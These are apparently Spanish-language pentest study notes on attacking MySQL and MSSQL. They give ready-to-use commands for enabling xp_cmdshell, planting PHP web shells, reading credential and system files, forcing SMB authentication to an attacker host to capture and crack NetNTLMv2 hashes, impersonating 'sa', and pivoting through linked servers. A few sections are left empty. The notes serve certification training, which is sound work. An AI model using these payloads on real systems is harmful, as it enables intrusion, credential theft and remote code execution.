
MySQL y MSSQL son sistemas de gestión de bases de datos relacionales que utilizan SQL para consultar y modificar información.

Son objetivos importantes porque pueden almacenar:

- Usuarios, contraseñas y hashes.
    
- Tokens y credenciales de servicios.
    
- Información sensible.
    
- Configuraciones de aplicaciones.
    
- Datos que permiten movimiento lateral.
    

**Puertos principales:**

|Servicio|Puerto|
|---|---|
|MySQL|TCP/3306|
|MSSQL|TCP/1433|
|MSSQL Browser|UDP/1434|
|MSSQL en modo oculto|TCP/2433|

Los principales vectores de ataque son:

- Credenciales débiles o configuraciones incorrectas.
    
- Lectura y modificación de bases de datos.
    
- Ejecución de comandos mediante `xp_cmdshell`.
    
- Lectura y escritura de archivos locales.
    
- Captura de hashes NetNTLMv2.
    
- Escalada mediante `IMPERSONATE`.
    
- Movimiento lateral mediante Linked Servers.

## 1. Enumeración

### Nmap

```
nmap -Pn -sC -sV -p1433,3306 <IP>
```

Permite identificar:

- Versión del servidor SQL.
    
- Nombre del equipo.
    
- Dominio Windows.
    
- Información del sistema operativo.
    
- Posibles vulnerabilidades conocidas.
    

### Autenticación MSSQL

MSSQL admite dos modos:

|Modo|Descripción|
|---|---|
|Windows Authentication|Utiliza cuentas Windows/Active Directory.|
|Mixed Mode|Permite cuentas Windows/AD y cuentas propias de SQL Server.|

Una configuración incorrecta puede permitir acceso con cuentas sin contraseña o usuarios con privilegios excesivos.

**CVE-2012-2122:** vulnerabilidad de autenticación que afecta a determinadas versiones de MySQL y permite que intentos repetidos con una contraseña incorrecta sean aceptados debido a un error de comparación.

## 2. Conexión a bases de datos

### MySQL

```
mysql -u <USER> -p<PASSWORD> -h <IP>
```

Ejemplo:

```
mysql -u julio -pPassword123 -h 10.129.20.13
```

### MSSQL - Impacket

```
impacket-mssqlclient '<USER>:<PASSWORD>@<IP>'
```

También podemos utilizar:

```
mssqlclient.py -p 1433 <USER>@<IP>
```

### MSSQL - SQL Authentication

```
sqsh -S <IP> -U <USER> -P '<PASSWORD>' -h
```

### MSSQL - Windows Authentication

Para autenticación mediante una cuenta Windows:

```
sqsh -S <IP> -U '.\<USER>' -P '<PASSWORD>' -h
```

Para cuentas de dominio:

```
impacket-mssqlclient -windows-auth '<DOMAIN>/<USER>:<PASSWORD>@<IP>'
```

### MSSQL desde Windows

```
sqlcmd -S <SERVER> -U <USER> -P "<PASSWORD>" -y 30 -Y 30
```

**Importante:** en `sqlcmd` debemos utilizar `GO` para ejecutar las consultas.

## 3. Enumerar bases de datos

### Bases de datos del sistema

**MySQL:**

- `mysql`: información interna del servidor.
    
- `information_schema`: metadatos de bases de datos y tablas.
    
- `performance_schema`: monitorización.
    
- `sys`: información administrativa.
    

**MSSQL:**

- `master`: configuración de la instancia.
    
- `msdb`: SQL Server Agent.
    
- `model`: plantilla de nuevas bases de datos.
    
- `resource`: objetos del sistema.
    
- `tempdb`: datos temporales.
    

### MySQL - Listar bases de datos

```
SHOW DATABASES;
```

Seleccionar una base de datos:

```
USE htbusers;
```

Listar tablas:

```
SHOW TABLES;
```

Consultar registros:

```
SELECT * FROM users;
```

### MSSQL - Listar bases de datos

```
SELECT name FROM master.dbo.sysdatabases;
```

Seleccionar base de datos:

```
USE htbusers;
```

Listar tablas:

```
SELECT table_name
FROM htbusers.INFORMATION_SCHEMA.TABLES;
```

Consultar registros:

```
SELECT * FROM users;
```

**Objetivo:** localizar tablas que contengan usuarios, contraseñas, tokens, configuraciones y credenciales reutilizables.

## 4. MSSQL - Remote Code Execution con xp_cmdshell

MSSQL dispone del procedimiento almacenado `xp_cmdshell`, que permite ejecutar comandos del sistema operativo.

**Características:**

- Está deshabilitado por defecto.
    
- Requiere privilegios suficientes para habilitarlo.
    
- Los comandos se ejecutan con los privilegios de la cuenta de servicio SQL Server o del proxy configurado.
    
- La ejecución es síncrona.
    

### Comprobar ejecución de comandos

```
EXEC xp_cmdshell 'whoami';
```

### Habilitar xp_cmdshell

Si tenemos los privilegios necesarios:

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Ejecutar comandos

```
EXEC xp_cmdshell 'whoami';
```

```
EXEC xp_cmdshell 'hostname';
```

```
EXEC xp_cmdshell 'ipconfig';
```

Ejemplo de resultado:

```
nt service\mssql$sqlexpress
```

Esto significa que estamos ejecutando comandos con los privilegios de la cuenta de servicio MSSQL.

**Importante:** conseguir RCE mediante `xp_cmdshell` no significa necesariamente disponer de privilegios SYSTEM.

## 5. MySQL - Escritura de archivos

MySQL permite escribir archivos mediante `SELECT INTO OUTFILE` cuando disponemos de los permisos necesarios.

Si el servicio comparte servidor con una aplicación web y podemos escribir en su directorio, podríamos conseguir ejecución de código.

### Comprobar secure_file_priv

```
SHOW VARIABLES LIKE 'secure_file_priv';
```

Posibles valores:

| Valor      | Significado                                        |
| ---------- | -------------------------------------------------- |
| Vacío      | No restringe las rutas de importación/exportación. |
| Directorio | Solo permite operaciones dentro de esa ruta.       |
| NULL       | Deshabilita estas operaciones.                     |

También necesitamos el privilegio `FILE` y permisos de escritura del sistema operativo.

### Escribir una Web Shell PHP

```
SELECT "<?php echo shell_exec($_GET['c']);?>"
INTO OUTFILE '/var/www/html/webshell.php';
```

Después podemos ejecutar comandos mediante el parámetro `c`:

```
curl 'http://<IP>/webshell.php?c=id'
```

**Importante:** el archivo debe encontrarse en un directorio servido por la aplicación web y ser interpretado como PHP.

## 6. MSSQL - Escritura de archivos mediante OLE

MSSQL permite utilizar **OLE Automation Procedures** para interactuar con objetos de Windows.

### Habilitar OLE Automation

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```

### Crear un archivo

```
DECLARE @OLE INT;
DECLARE @FileID INT;

EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;

EXECUTE sp_OAMethod @OLE, 'OpenTextFile',
    @FileID OUT,
    'C:\inetpub\wwwroot\webshell.php',
    8, 1;

EXECUTE sp_OAMethod @FileID, 'WriteLine',
    NULL,
    '<?php echo shell_exec($_GET["c"]);?>';

EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;
```

Esto permite escribir archivos utilizando los permisos de la cuenta que ejecuta el servicio SQL Server.

## 7. Lectura de archivos locales

### MSSQL - OPENROWSET

Podemos intentar leer archivos locales mediante `OPENROWSET`:

```
SELECT *
FROM OPENROWSET(
    BULK N'C:/Windows/System32/drivers/etc/hosts',
    SINGLE_CLOB
) AS Contents;
```

La lectura depende de los permisos de la cuenta del servicio y de la configuración de SQL Server.

### MySQL - LOAD_FILE

```
SELECT LOAD_FILE('/etc/passwd');
```

También podemos consultar otros archivos accesibles:

```
SELECT LOAD_FILE('/var/www/html/config.php');
```

**Requisitos:**

- Privilegio `FILE`.
    
- Permisos de lectura del sistema operativo.
    
- Configuración compatible de `secure_file_priv`.

## 8. Capturar hashes NetNTLMv2 mediante MSSQL

MSSQL dispone de procedimientos que permiten enumerar directorios del sistema.

Podemos aprovecharlos para forzar una conexión SMB hacia nuestro equipo y capturar una autenticación NetNTLMv2.

Los procedimientos utilizados son:

- `xp_dirtree`
    
- `xp_subdirs`
    

### Paso 1. Iniciar Responder

```
sudo responder -I tun0
```

Alternativamente:

```
sudo impacket-smbserver share ./ -smb2support
```

### Paso 2. Forzar autenticación SMB

Desde MSSQL:

```
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\';
```

Alternativamente:

```
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\';
```

El servidor MSSQL intenta acceder al recurso SMB remoto.

Si se produce autenticación NTLM, podemos capturar una respuesta NetNTLMv2.

### Paso 3. Crackear el hash

Guardar la respuesta capturada en `hash.txt`:

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Importante:** el hash capturado es NetNTLMv2, no un hash NTLM directamente reutilizable mediante Pass-the-Hash.

Dependiendo de la configuración, también podría utilizarse en un ataque NTLM Relay.

## 9. MSSQL - Escalada mediante IMPERSONATE

El permiso **IMPERSONATE** permite ejecutar consultas utilizando el contexto de seguridad de otro usuario de SQL Server.

Si podemos suplantar una cuenta con privilegios elevados, podríamos escalar privilegios dentro de MSSQL.

### Enumerar usuarios relacionados con IMPERSONATE

Consulta utilizada en HTB Academy:

```
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

Esta consulta identifica los otorgantes de permisos `IMPERSONATE`. Para determinar qué usuarios podemos suplantar realmente, debemos comprobar los permisos efectivos de nuestra sesión.

### Comprobar usuario actual

```
SELECT SYSTEM_USER;
```

### Comprobar privilegios sysadmin

```
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Resultados:

```
0 = No somos sysadmin
1 = Somos sysadmin
```

### Suplantar al usuario sa

Primero cambiamos a `master`:

```
USE master;
```

Después:

```
EXECUTE AS LOGIN = 'sa';
```

Comprobamos:

```
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Si devuelve:

```
sa
1
```

Hemos conseguido ejecutar consultas con privilegios `sysadmin`.

### Restaurar usuario original

```
REVERT;
```

**Importante:** para utilizar `EXECUTE AS LOGIN` necesitamos permisos de suplantación sobre la cuenta correspondiente.

## 10. MSSQL - Linked Servers

Los **Linked Servers** permiten que una instancia MSSQL ejecute consultas sobre otras instancias SQL.

Podemos aprovecharlos para realizar movimiento lateral cuando las credenciales configuradas en el servidor vinculado tienen privilegios suficientes.

### Enumerar servidores vinculados

```
SELECT srvname, isremote
FROM sysservers;
```

Ejemplo:

```
DESKTOP-MFERMN4\SQLEXPRESS
10.0.0.12\SQLEXPRESS
```

### Ejecutar consultas remotamente

```
EXECUTE(
    'SELECT @@servername, @@version, SYSTEM_USER'
) AT [10.0.0.12\SQLEXPRESS];
```

### Comprobar privilegios en el servidor remoto

```
EXECUTE(
    'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')'
) AT [10.0.0.12\SQLEXPRESS];
```

**Importante:** cuando utilizamos comillas simples dentro de una consulta remota, debemos escaparlas duplicándolas:

```
''sysadmin''
```

Si el usuario utilizado por el Linked Server tiene privilegios `sysadmin`, podremos realizar operaciones administrativas en la instancia remota.

Dependiendo de la configuración, también podríamos conseguir ejecución de comandos mediante `xp_cmdshell`.


### Paso 7. Comprobar autenticación SMB forzada

```

```

### Paso 8. Buscar escalada mediante IMPERSONATE

```

```

## 12. Comandos importantes para CPTS / OSCP

```
# Enumeración
nmap -Pn -sC -sV -p1433,3306 <IP>

# Conexión MySQL
mysql -u <USER> -p<PASSWORD> -h <IP>

# Conexión MSSQL
impacket-mssqlclient '<USER>:<PASSWORD>@<IP>'

# MSSQL con autenticación Windows
impacket-mssqlclient -windows-auth '<DOMAIN>/<USER>:<PASSWORD>@<IP>'

# Captura de hashes SMB
sudo responder -I tun0

# Servidor SMB con Impacket
sudo impacket-smbserver share ./ -smb2support

# Crackear NetNTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### MySQL

```
-- Enumerar bases de datos
SHOW DATABASES;

-- Seleccionar base de datos
USE <DATABASE>;

-- Enumerar tablas
SHOW TABLES;

-- Consultar registros
SELECT * FROM <TABLE>;

-- Comprobar privilegios
SHOW GRANTS;

-- Comprobar restricciones de archivos
SHOW VARIABLES LIKE 'secure_file_priv';

-- Leer archivos
SELECT LOAD_FILE('/etc/passwd');

-- Escribir archivos
SELECT '<?php echo shell_exec($_GET["c"]);?>'
INTO OUTFILE '/var/www/html/webshell.php';
```

### MSSQL

```
-- Enumerar bases de datos
SELECT name FROM master.dbo.sysdatabases;

-- Enumerar tablas
SELECT table_name FROM <DATABASE>.INFORMATION_SCHEMA.TABLES;

-- Usuario actual
SELECT SYSTEM_USER;

-- Comprobar sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Habilitar xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Ejecutar comandos
EXEC xp_cmdshell 'whoami';

-- Leer archivos
SELECT *
FROM OPENROWSET(
    BULK N'C:/Windows/System32/drivers/etc/hosts',
    SINGLE_CLOB
) AS Contents;

-- Forzar autenticación SMB
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\';

-- Alternativa
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\';

-- Suplantar usuario
USE master;
EXECUTE AS LOGIN = 'sa';

-- Restaurar contexto
REVERT;

-- Enumerar Linked Servers
SELECT srvname, isremote FROM sysservers;

-- Ejecutar consulta en servidor vinculado
EXECUTE(
    'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')'
) AT [<LINKED_SERVER>];
```

## 13. Puntos clave

- **MySQL:** TCP/3306.
    
- **MSSQL:** TCP/1433.
    
- `**information_schema**`**:** permite enumerar metadatos de bases de datos.
    
- `**xp_cmdshell**`**:** permite ejecutar comandos del sistema desde MSSQL.
    
- `**SELECT INTO OUTFILE**`**:** permite escribir archivos mediante MySQL.
    
- `**LOAD_FILE()**`**:** permite leer archivos desde MySQL.
    
- `**OPENROWSET(BULK...)**`**:** permite leer archivos mediante MSSQL.
    
- `**secure_file_priv**`**:** controla las restricciones de importación/exportación de archivos en MySQL.
    
- `**xp_dirtree**` **/** `**xp_subdirs**`**:** pueden forzar autenticaciones SMB y permitir capturar NetNTLMv2.
    
- `**IMPERSONATE**`**:** puede permitir escalar privilegios suplantando usuarios de MSSQL.
    
- `**EXECUTE AS LOGIN**`**:** cambia el contexto de seguridad.
    
- `**IS_SRVROLEMEMBER('sysadmin')**`**:** comprueba si tenemos privilegios administrativos.
    
- **Linked Servers:** pueden permitir movimiento lateral entre servidores SQL.
    
- `**EXECUTE(...) AT**`**:** permite ejecutar consultas sobre servidores vinculados.
    

**Prioridad en CPTS/OSCP:** enumerar bases de datos y credenciales, comprobar privilegios, buscar `xp_cmdshell`, probar lectura de archivos, identificar permisos `IMPERSONATE` y enumerar Linked Servers.
